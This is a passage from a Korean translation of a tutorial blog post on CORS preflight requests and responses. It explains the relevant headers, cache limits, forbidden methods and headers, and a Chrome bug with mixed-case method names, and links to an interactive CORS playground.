'일반적이지 않다'로 간주되는 것은 꽤 복잡하지만, 높은 수준에서, 만약 그것이 다른 브라우저 API들이 일반적으로 하지 않는 종류의 요청이라면, 그것은 이례적이다. 더 낮은 수준에서 요청 메서드가 `GET`, `HEAD` 또는 `POST`가 아니거나 [안전한 목록](https://fetch.spec.whatwg.org/#cors-safelisted-request-header)의 일부가 아닌 헤더 또는 헤더 값을 포함하는 경우 일반적이지 않은 요청으로 간주된다. 사실, 필자는 이 리스트에 특정 `Range` 헤더를 추가하기 위해 최근에 [스펙의 이 부분을 변경](https://github.com/whatwg/fetch/pull/1312)했다.

특이하게 요청하려고 하면 브라우저가 먼저 다른 출처에게 보내도 괜찮은지 물어본다. 이 과정을 *프리플라이트(preflight, 사전 전달)*라고 한다.

### 프리플라이트(preflight, 사전 전달) 요청

기본 요청을 하기 전에 브라우저는 `OPTIONS` 메소드와 헤더로 대상 URL에 프리플라이트 요청을 한다. 그리고 헤더들은 다음과 같이 보내진다.

```
Access-Control-Request-Method: wibbley-wobbley
Access-Control-Request-Headers: fancy, here-we
```

* `Access-Control-Request-Method` - 기본 요청이 사용할 HTTP 메서드. 이것은 요청 방법이 일반적이지 않더라도 포함되어 있다.
* `Access-Control-Request-Headers` - 기본 요청이 사용할 일반적이지 않은 헤더입니다. 일반적이지 않은 헤더가 없으면 이 헤더는 전송되지 않는다.


예비 요청에는 자격 증명이 포함되지 않는다. (메인 요청에도 포함됨)

### 프리플라이트(preflight, 사전 전달) 응답

서버는 다음과 같은 헤더를 사용하여 기본 요청이 적합한지 여부를 나타낸다.

```
Access-Control-Max-Age: 600
Access-Control-Allow-Methods: wibbley-wobbley
Access-Control-Allow-Headers: fancy, here-we
```

* `Access-Control-Max-Age` - 이 URL에 대한 추가 프리플라이트가 필요하지 않도록 이 프리플라이트 응답을 캐시 할 초 단위 시간이다. 기본값은 5초다. 일부 브라우저에는 이에 대한 상한선이 있다. Chrome의 경우 600(10분), Firefox의 경우 86400(24시간)이다. 
* `Access-Control-Allow-Methods` - 일반적이지 않은 요청 방법을 허용한다. 쉼표로 구분된 목록일 수 있으며 값은 대소문자를 구분한다. 기본 요청이 자격 증명 없이 전송될 경우 (거의) 모든 메서드를 허용하기 위해 `*`가 될 수 있다. `CONNECT`, `TRACE` 또는 `TRACKE`는 보안상의 이유로 🔥💀[금지된 목록](https://fetch.spec.whatwg.org/#forbidden-method)💀🔥에 있으므로 허용할 수 없다. 
* `Access-Control-Allow-Headers` - 일반적이지 않은 요청 헤더를 허용한다. 쉼표로 구분된 목록일 수 있으며 헤더 이름은 대소문자를 구분하지 않으므로 값은 대소문자를 구분하지 않는다. 기본 요청을 자격 증명 없이 보내려는 경우, 🔥💀[금지된 헤더 이름](https://fetch.spec.whatwg.org/#forbidden-header-name)💀🔥에 없는 헤더를 허용하기 위해 `*`일 수 있다. 

🔥💀[금지된 헤더 이름](https://fetch.spec.whatwg.org/#forbidden-header-name)💀🔥의 헤더는 보안상의 이유로 브라우저의 제어에 남아 있어야 하는 헤더이다. 이런 금지된 헤더 목록이 포함된다면 자동으로(그리고 조용하게) CORS 요청 및 `Access-Control-Allow-Headers`에서 제거된다.

또한 프리플라이트 응답은 정기적인 CORS 검사를 통과해야 하므로 기본 요청이 자격 증명과 함께 전송되려면 `Access-Control-Allow-Origin` 및 `Access-Control-Allow-Credentials: true` 헤더가 필요하며 상태 코드는 200-299 사이여야 한다. 

원하는 요청 방법이 허용되고 모든 의도된 헤더가 허용되면 기본 요청이 진행된다. 

아, 그리고 프리플라이트 요청은 실제 요청을 해도 되는지에 대한 승인만 진행한다. 최종 원하는 응답은 또한 CORS 검사를 통과해야 한다. 

상태 코드 제한은 약간의 오해를 만든다. `/artists/Pip-Blom`과 같은 API가 있는 경우 'Pip Blom'이 데이터베이스에 없으면 404를 반환할 수 있다. 404 코드(및 응답 본문)가 표시되기를 원하기 때문에 클라이언트는 다른 종류의 서버 오류가 아닌 요청 했던 것이 '찾을 수 없다'라는 것을 알 수 있다. 그러나 만약 요청이 프리플라이트 요청을 필요로 한다면, 프리플라이트 요청은 최종 응답이 404가 되더라도 200-299 코드를 반환해야 한다.

**chrome 메서드 이름에 대한 버그**

이런 글을 쓰기 전까지 알지 못했던 [chrome 버그](https://bugs.chromium.org/p/chromium/issues/detail?id=1228178)들도 있다.

HTTP 메서드 이름은 대소문자를 구분한다. `get`, `post`, `head`, `delete`, `options` 또는 `put`에 대소문자를 구분하지 않는 메서드 이름을 사용하면 자동으로 대문자로 표시되지만 다른 메서드는 사용자가 사용하는 케이스를 유지한다.

유감스럽게도 chrome은 `Access-Control-Allow-Methods`에서 값이 대문자인 것으로 예상한다. 요청 방법이 `Wibbley-Wobbley`이고 프리플라이트 요청에 대한 응답은 다음과 같다.

```
Access-Control-Allow-Methods: Wibbley-Wobbley
```

반면에 위와 같은 응답은 Chrome에서 요청과 다른 메서드라고 인지해서 통과하지 못한다.

``` 
Access-Control-Allow-Methods: WIBBLEY-WOBBLEY 
``` 

위와 같이 응답에서 설정하면 Chrome에서 검사를 통과하지만(Wibbley-Wobbley 방식으로 요청을 했을 때), 사양을 따르는 다른 브라우저에서는 실패한다. 이 문제를 해결하기 위해 다음 두 가지 방법을 모두 제공할 수 있다. 

``` 
Access-Control-Allow-Methods: Wibbley-Wobbley, WIBBLEY-WOBBLEY 
``` 

또는 자격 증명 없는 요청인 경우 `*`을 사용한다. 

마지막으로 CORS playground에서 이 모든 것을 종합해보자.

* [간단한 요청](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=) - 프리플라이트 요청이 필요하지 않다.
* [문제가 발생하는 일반적이지 않은 요청 헤더](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=405&preflightAllowOrigin=&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=hello&requestHeaderValue=world) - 프리플라이트를 요청하고 서버는 이를 받아들이지 않는다.
* [문제가 발생하지 않는 일반적이지 않은 요청 헤더](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=*&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=hello&requestHeaderValue=world) - 허락된 헤더를 포함한 프리플라이트 요청을 했기 때문에 실제 요청으로 넘어간다.
* [일반 Range 헤더](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=GET&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=&preflightAllowHeaders=*&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=&requestHeaderName=range&requestHeaderValue=bytes%3D0-) - 이 스펙은 [필자가 만든 것](https://github.com/whatwg/fetch/pull/1312)과 연관이 있다. 브라우저가 변경사항을 구현하면 프리플라이트 요청이 필요 없게 만든다. 현재는 chrome 카나리에 구현되어 있다.
* [문제가 발생하는 일반적이지 않은 요청 방식](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=Wibbley-Wobbley&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=Wibbley-Wobbley&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=) - 이것이 위 문서에 나와있는 chrome 버그이다. 이 요청은 chrome에서는 수행되지 않지만 다른 브라우저에서는 수행이 된다.
* [문제가 발생하지 않는 일반적이지 않은 요청 방식](https://jakearchibald.com/2021/cors/playground/?prefillForm=1&requestMethod=Wibbley-Wobbley&requestUseCORS=1&requestSendCredentials=&preflightStatus=206&preflightAllowOrigin=*&preflightAllowCredentials=&preflightAllowMethods=Wibbley-Wobbley%2C+WIBBLEY-WOBBLEY&preflightAllowHeaders=&responseAllowOrigin=*&responseAllowCredentials=&responseExposeHeaders=) - 이 요청은 chrome 버그가 있어도 잘 동작한다.

## 휴!

끝까지 오느라 모두들 고생했다! 이 게시물이 생각보다 훨씬 더 길어져서 미안하지만, 여러분이 CORS를 모두 이해하는 데 도움이 되었기를 바란다.

[Anne van Kesteren](https://twitter.com/annevk), [Simon Pieters](https://twitter.com/zcorpan), [Thomas Steiner](https://twitter.com/tomayac), [Ethan](https://twitter.com/Booligoosh), [Mathias Bynens](https://twitter.com/mathias), [Jeff Posnick](https://twitter.com/jeffposnick) 및 [Matt Hobbs](https://twitter.com/TheRealNooshu)에게 교정, 사실 확인 및 더 자세한 정보가 필요한 부분을 찾아 주셔서 고맙다.
